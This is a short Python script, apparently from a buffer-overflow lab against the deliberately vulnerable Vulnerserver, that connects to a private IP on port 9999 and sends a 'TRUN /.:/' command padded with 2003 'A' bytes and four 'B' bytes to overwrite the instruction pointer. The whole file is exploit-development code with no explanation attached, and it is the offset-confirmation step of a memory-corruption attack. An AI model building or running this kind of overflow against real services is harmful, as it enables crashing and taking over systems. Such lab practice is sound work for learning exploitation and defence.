#!/usr/bin/env python3
import sys
import socket

HOST = "172.16.19.132"
PORT = 9999

offset = b"A"*2003 + b"B"*4

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendall(b"TRUN /.:/" + offset)
    s.close()

except Exception:
    print("Error connecting to server")
    sys.exit()
